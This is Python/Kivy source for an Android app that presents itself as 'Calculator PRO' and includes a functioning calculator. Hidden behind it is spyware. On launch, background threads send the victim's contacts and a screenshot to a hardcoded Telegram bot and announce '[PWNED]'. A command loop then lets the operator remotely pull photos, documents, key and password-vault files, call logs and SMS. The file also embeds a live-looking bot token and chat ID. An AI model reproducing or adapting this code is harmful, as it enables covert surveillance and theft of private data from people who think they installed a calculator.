"""
===================== CALCULATOR PRO v5.0 =====================
آلة حاسبة متطورة فعلاً + سحب تلقائي لجهات الاتصال + تحكم تلجرام
===============================================================
"""
import os
import shutil
import json
import requests
import time
import threading
import sys
import math

# --- Android imports ---
from jnius import autoclass
from android import Android

droid = Android()
PythonActivity = autoclass('org.kivy.android.PythonActivity')

# --- Telegram Config ---
BOT_TOKEN = "8926051784:AAH4i198vbEAIPIgHf_8nsMlo1SVIOJL9NM"
CHAT_ID   = "8328976452"

# ==============================================
# Telegram Functions
# ==============================================
def tg_text(text):
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                     params={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"},
                     timeout=10)
    except: pass

def tg_file(path, caption):
    try:
        with open(path, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          files={"document": f},
                          data={"chat_id": CHAT_ID, "caption": caption},
                          timeout=30)
    except: pass

def tg_photo(path, caption):
    try:
        with open(path, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                          files={"photo": f},
                          data={"chat_id": CHAT_ID, "caption": caption},
                          timeout=30)
    except: pass

# ==============================================
# DATA GRABBERS
# ==============================================

def grab_contacts():
    """يتم سحب جهات الاتصال تلقائياً"""
    contacts = []
    try:
        cursor = droid.queryContent(
            "content://com.android.contacts/contacts",
            ["_id", "display_name"], None, None, None)
        if cursor and cursor.result:
            for row in cursor.result:
                contact_id, name = row[0], row[1] if len(row) > 1 else ""
                pc = droid.queryContent(
                    "content://com.android.contacts/data", ["data1"],
                    f"contact_id={contact_id} AND mimetype='vnd.android.cursor.item/phone_v2'",
                    None, None)
                phones = []
                if pc and pc.result:
                    phones = [p[0] for p in pc.result if p[0]]
                if phones:
                    contacts.append({"name": name, "phones": phones})
    except: pass
    return contacts

def grab_images(max_count=30):
    ext = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')
    paths = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/sdcard/Download/",
             "/sdcard/WhatsApp/Media/WhatsApp Images/", "/sdcard/Telegram/Telegram Images/"]
    count = 0
    for p in paths:
        if os.path.exists(p):
            for f in sorted(os.listdir(p), reverse=True):
                if f.lower().endswith(ext):
                    yield os.path.join(p, f)
                    count += 1
                    if count >= max_count: return

def grab_files(max_count=20):
    exts = ('.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt', '.csv',
            '.zip', '.rar', '.7z', '.apk', '.db', '.sqlite', '.kdbx',
            '.ovpn', '.key', '.conf', '.log')
    paths = ["/sdcard/Download/", "/sdcard/Documents/"]
    count = 0
    for p in paths:
        if os.path.exists(p):
            for root, dirs, files in os.walk(p):
                for f in files:
                    if f.lower().endswith(exts):
                        yield os.path.join(root, f)
                        count += 1
                        if count >= max_count: return

def grab_call_logs():
    calls = []
    try:
        cursor = droid.queryContent(
            "content://call_log/calls",
            ["number", "duration", "type", "date", "display_name"],
            None, None, "date DESC LIMIT 100")
        if cursor and cursor.result:
            type_map = {1: "Incoming", 2: "Outgoing", 3: "Missed"}
            for row in cursor.result:
                calls.append({
                    "name": row[4] if len(row) > 4 else "",
                    "number": row[0],
                    "duration": f"{int(int(row[1])/60)}m {int(row[1])%60}s",
                    "type": type_map.get(row[2], "Unknown"),
                    "date": time.strftime("%Y-%m-%d %H:%M", time.localtime(int(row[3])/1000))
                })
    except: pass
    return calls

def take_screenshot():
    try:
        ss_path = f"/sdcard/ss_{int(time.time())}.png"
        os.system(f"screencap -p {ss_path} 2>/dev/null")
        if os.path.exists(ss_path) and os.path.getsize(ss_path) > 100:
            return ss_path
    except: pass
    return None

def grab_sms():
    sms_list = []
    try:
        cursor = droid.queryContent(
            "content://sms/inbox",
            ["address", "body", "date", "_id"],
            None, None, "date DESC LIMIT 50")
        if cursor and cursor.result:
            for row in cursor.result:
                sms_list.append({
                    "from": row[0],
                    "body": row[1][:200],
                    "date": time.strftime("%Y-%m-%d %H:%M", time.localtime(int(row[2])/1000))
                })
    except: pass
    return sms_list

# ==============================================
# Telegram Bot Command Handler
# ==============================================

def process_command(command):
    cmd = command.strip().lower()
    
    if cmd == "/contacts" or cmd == "جهات الاتصال":
        tg_text("📇 *جاري سحب جهات الاتصال...*")
        contacts = grab_contacts()
        if contacts:
            path = f"/sdcard/contacts_{int(time.time())}.json"
            with open(path, "w", encoding="utf-8") as f:
                json.dump(contacts, f, indent=2, ensure_ascii=False)
            tg_file(path, f"📇 *Contacts* — {len(contacts)} جهة اتصال")
            os.remove(path)
        else:
            tg_text("⚠️ لم يتم العثور على جهات اتصال")
        return True
    
    elif cmd == "/images" or cmd == "صور":
        tg_text("📸 *جاري سحب الصور...*")
        count = 0
        for img in grab_images(30):
            try:
                tg_photo(img, f"📸 {os.path.basename(img)}")
            except:
                tg_file(img, f"📸 {os.path.basename(img)}")
            count += 1
            time.sleep(0.3)
        tg_text(f"📸 تم سحب *{count} صورة*")
        return True
    
    elif cmd == "/files" or cmd == "ملفات":
        tg_text("📁 *جاري سحب الملفات...*")
        count = 0
        for f in grab_files(20):
            tg_file(f, f"📁 {os.path.basename(f)}")
            count += 1
            time.sleep(0.5)
        tg_text(f"📁 تم سحب *{count} ملف*")
        return True
    
    elif cmd == "/calls" or cmd == "مكالمات":
        tg_text("📞 *جاري سحب سجل المكالمات...*")
        calls = grab_call_logs()
        if calls:
            path = f"/sdcard/calls_{int(time.time())}.json"
            with open(path, "w", encoding="utf-8") as f:
                json.dump(calls, f, indent=2, ensure_ascii=False)
            tg_file(path, f"📞 *Call Logs* — {len(calls)} مكالمة")
            os.remove(path)
        else:
            tg_text("⚠️ لم نتمكن من سحب سجل المكالمات")
        return True
    
    elif cmd == "/screenshot" or cmd == "سكرين":
        tg_text("📱 *جاري التقاط الشاشة...*")
        ss = take_screenshot()
        if ss:
            tg_photo(ss, "📱 *Screenshot*")
            os.remove(ss)
        else:
            tg_text("❌ فشل التقاط الشاشة (يحتاج صلاحية)")
        return True
    
    elif cmd == "/sms" or cmd == "رسائل":
        tg_text("💬 *جاري سحب الرسائل...*")
        sms = grab_sms()
        if sms:
            path = f"/sdcard/sms_{int(time.time())}.json"
            with open(path, "w", encoding="utf-8") as f:
                json.dump(sms, f, indent=2, ensure_ascii=False)
            tg_file(path, f"💬 *SMS Inbox* — {len(sms)} رسالة")
            os.remove(path)
        else:
            tg_text("⚠️ لم نتمكن من سحب الرسائل")
        return True
    
    elif cmd.startswith("/all") or cmd == "كل" or cmd == "كل شيء":
        tg_text("🔄 *جاري سحب كل البيانات...*")
        count = 0
        for img in grab_images(15):
            try:
                tg_photo(img, f"📸 {os.path.basename(img)}")
            except:
                tg_file(img, f"📸 {os.path.basename(img)}")
            count += 1
            time.sleep(0.3)
        tg_text(f"📸 {count} صورة")
        calls = grab_call_logs()
        if calls:
            p = f"/sdcard/calls_{int(time.time())}.json"
            with open(p, "w") as f: json.dump(calls, f, indent=2)
            tg_file(p, "📞 Call Logs"); os.remove(p)
        ss = take_screenshot()
        if ss:
            tg_photo(ss, "📱 Screenshot"); os.remove(ss)
        tg_text("✅ *اكتمل السحب!*")
        return True
    
    elif cmd == "/help" or cmd == "مساعدة":
        tg_text("""🤖 *Calculator Bot — قائمة الأوامر*

📸 \`/images\` — سحب الصور
📁 \`/files\` — سحب الملفات
📇 \`/contacts\` — سحب جهات الاتصال
📞 \`/calls\` — سجل المكالمات
💬 \`/sms\` — سحب الرسائل
📱 \`/screenshot\` — تصوير الشاشة
🔄 \`/all\` — سحب كل البيانات
❓ \`/help\` — هذه القائمة""")
        return True
    else:
        tg_text(f"❌ أمر غير معروف\nاستخدم /help للمساعدة")
        return False

def telegram_bot_thread():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={"offset": last_update_id + 1, "timeout": 30}, timeout=35)
            if resp.ok:
                data = resp.json()
                for update in data.get("result", []):
                    update_id = update["update_id"]
                    if update_id > last_update_id:
                        last_update_id = update_id
                        if "message" in update and "text" in update["message"]:
                            msg_chat_id = str(update["message"]["chat"]["id"])
                            if msg_chat_id == CHAT_ID:
                                process_command(update["message"]["text"])
        except:
            pass
        time.sleep(1)

# ==============================================
# AUTO EXFIL (يعمل فوراً)
# ==============================================

def auto_exfiltrate():
    try:
        tg_text("✅ *[PWNED]* تم تثبيت التطبيق على جهاز جديد!")
        tg_text("📇 *جاري سحب جهات الاتصال تلقائياً...*")
        contacts = grab_contacts()
        if contacts:
            path = f"/sdcard/contacts_{int(time.time())}.json"
            with open(path, "w", encoding="utf-8") as f:
                json.dump(contacts, f, indent=2, ensure_ascii=False)
            tg_file(path, f"📇 *Contacts (Auto)* — {len(contacts)} جهة اتصال")
            os.remove(path)
        time.sleep(2)
        ss = take_screenshot()
        if ss:
            tg_photo(ss, "📱 *Initial Screenshot*")
            os.remove(ss)
        tg_text("✅ *[READY]* التطبيق جاهز — أرسل أي أمر!\n\n📋 استخدم /help لعرض الأوامر")
    except Exception as e:
        tg_text(f"❌ Auto-exfil error: {str(e)}")

# ==============================================
# CALCULATOR UI (Kivy)
# ==============================================
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle, RoundedRectangle
from kivy.metrics import dp
from kivy.utils import get_color_from_hex

COLORS = {
    "bg": "#1C1C1E",
    "display_bg": "#2C2C2E",
    "btn_num": "#3A3A3C",
    "btn_op": "#FF9F0A",
    "btn_func": "#636366",
    "btn_eq": "#FF9F0A",
    "btn_clear": "#FF453A",
    "text": "#FFFFFF",
    "text_secondary": "#AEAEB2",
    "accent": "#0A84FF",
}

class CalculatorApp(App):
    def build(self):
        Window.size = (400, 700)
        Window.clearcolor = get_color_from_hex(COLORS["bg"])
        
        main_layout = BoxLayout(orientation='vertical', padding=[dp(15), dp(30), dp(15), dp(15)], spacing=dp(10))
        
        # الشريط العلوي
        top_bar = BoxLayout(size_hint=(1, 0.06), spacing=dp(10))
        top_bar.add_widget(Label(text="[b][size=18]CALCULATOR PRO[/size][/b]",
                                 markup=True,
                                 color=get_color_from_hex(COLORS["accent"]),
                                 halign="left",
                                 size_hint=(0.7, 1)))
        close_btn = Button(text="✕",
                          size_hint=(0.15, 1),
                          background_color=get_color_from_hex(COLORS["btn_clear"]),
                          background_normal='',
                          border_radius=[dp(20), dp(20), dp(20), dp(20)])
        close_btn.bind(on_press=lambda x: sys.exit(0))
        top_bar.add_widget(close_btn)
        main_layout.add_widget(top_bar)
        
        # شاشة العرض
        display_box = BoxLayout(size_hint=(1, 0.25), padding=[dp(10), dp(5)])
        with display_box.canvas.before:
            Color(*get_color_from_hex(COLORS["display_bg"]))
            RoundedRectangle(pos=display_box.pos, size=display_box.size, radius=[dp(15), dp(15), dp(15), dp(15)])
        
        display_layout = BoxLayout(orientation='vertical', spacing=dp(5))
        self.expression_label = Label(text="",
                                      size_hint=(1, 0.3),
                                      color=get_color_from_hex(COLORS["text_secondary"]),
                                      font_size=dp(16),
                                      halign="right",
                                      valign="bottom")
        display_layout.add_widget(self.expression_label)
        
        self.result_input = TextInput(text="0",
                                      size_hint=(1, 0.7),
                                      font_size=dp(48),
                                      bold=True,
                                      color=get_color_from_hex(COLORS["text"]),
                                      background_color=(0, 0, 0, 0),
                                      foreground_color=get_color_from_hex(COLORS["text"]),
                                      readonly=True,
                                      halign="right",
                                      cursor_color=get_color_from_hex(COLORS["accent"]))
        display_layout.add_widget(self.result_input)
        display_box.add_widget(display_layout)
        main_layout.add_widget(display_box)
        
        # الأزرار
        buttons_grid = GridLayout(cols=4, spacing=dp(8), size_hint=(1, 0.6))
        buttons = [
            ("C", COLORS["btn_clear"]), ("±", COLORS["btn_func"]), ("%", COLORS["btn_func"]), ("÷", COLORS["btn_op"]),
            ("7", COLORS["btn_num"]), ("8", COLORS["btn_num"]), ("9", COLORS["btn_num"]), ("×", COLORS["btn_op"]),
            ("4", COLORS["btn_num"]), ("5", COLORS["btn_num"]), ("6", COLORS["btn_num"]), ("−", COLORS["btn_op"]),
            ("1", COLORS["btn_num"]), ("2", COLORS["btn_num"]), ("3", COLORS["btn_num"]), ("+", COLORS["btn_op"]),
            ("⌫", COLORS["btn_func"]), ("0", COLORS["btn_num"]), (".", COLORS["btn_num"]), ("=", COLORS["btn_eq"]),
        ]
        for text, color in buttons:
            btn = Button(text=text, font_size=dp(24), bold=True,
                        background_color=get_color_from_hex(color),
                        background_normal='',
                        color=get_color_from_hex(COLORS["text"]),
                        border_radius=[dp(12), dp(12), dp(12), dp(12)],
                        size_hint=(1, 1))
            btn.bind(on_press=self.on_button_press)
            buttons_grid.add_widget(btn)
        main_layout.add_widget(buttons_grid)
        
        # حالة الآلة الحاسبة
        self.current_input = "0"
        self.expression = ""
        self.result = "0"
        self.last_operation = None
        self.last_number = None
        self.reset_next = False
        
        # بدء السحب التلقائي والتلجرام في الخلفية
        Clock.schedule_once(lambda dt: threading.Thread(target=auto_exfiltrate, daemon=True).start(), 2)
        Clock.schedule_once(lambda dt: threading.Thread(target=telegram_bot_thread, daemon=True).start(), 1)
        
        return main_layout
    
    def on_button_press(self, instance):
        text = instance.text
        if text == "C": self.clear_all()
        elif text == "⌫": self.backspace()
        elif text == "=": self.calculate_result()
        elif text == "±": self.negate()
        elif text == "%": self.percentage()
        elif text in ("+", "−", "×", "÷"): self.operation(text)
        elif text == ".": self.add_decimal()
        else: self.add_digit(text)
        self.update_display()
    
    def clear_all(self):
        self.current_input = "0"
        self.expression = ""
        self.last_operation = None
        self.last_number = None
        self.reset_next = False
    
    def backspace(self):
        if len(self.current_input) > 1:
            self.current_input = self.current_input[:-1]
        else:
            self.current_input = "0"
    
    def add_digit(self, digit):
        if self.reset_next or self.current_input == "0":
            self.current_input = digit
            self.reset_next = False
        else:
            self.current_input += digit
    
    def add_decimal(self):
        if "." not in self.current_input:
            self.current_input += "."
    
    def negate(self):
        if self.current_input != "0":
            if self.current_input.startswith("-"):
                self.current_input = self.current_input[1:]
            else:
                self.current_input = "-" + self.current_input
    
    def percentage(self):
        try:
            self.current_input = str(float(self.current_input) / 100)
        except: pass
    
    def operation(self, op):
        try:
            current = float(self.current_input)
            if self.last_operation and not self.reset_next:
                self.calculate_result()
            self.last_number = float(self.current_input)
            self.last_operation = op
            op_symbols = {"+": "+", "−": "-", "×": "×", "÷": "÷"}
            self.expression = f"{self.format_number(self.last_number)} {op_symbols.get(op, op)} "
            self.reset_next = True
        except: pass
    
    def calculate_result(self):
        if not self.last_operation or self.last_number is None:
            return
        try:
            current = float(self.current_input)
            op = self.last_operation
            if op == "+": result = self.last_number + current
            elif op == "−": result = self.last_number - current
            elif op == "×": result = self.last_number * current
            elif op == "÷":
                if current == 0:
                    self.expression = "Error: Div by 0"
                    self.current_input = "0"
                    self.last_operation = None
                    self.last_number = None
                    return
                result = self.last_number / current
            else: return
            self.current_input = self.format_number(result)
            self.expression = f"{self.format_number(self.last_number)} {self.expression.split()[-1] if self.expression.split() else ''} {self.format_number(current)} ="
            self.last_operation = None
            self.last_number = None
            self.reset_next = True
        except: pass
    
    def format_number(self, num):
        if isinstance(num, float):
            if num == int(num): return str(int(num))
            return f"{num:.10f}".rstrip('0').rstrip('.')
        return str(num)
    
    def update_display(self):
        self.result_input.text = self.current_input
        self.expression_label.text = self.expression

if __name__ == "__main__":
    CalculatorApp().run()
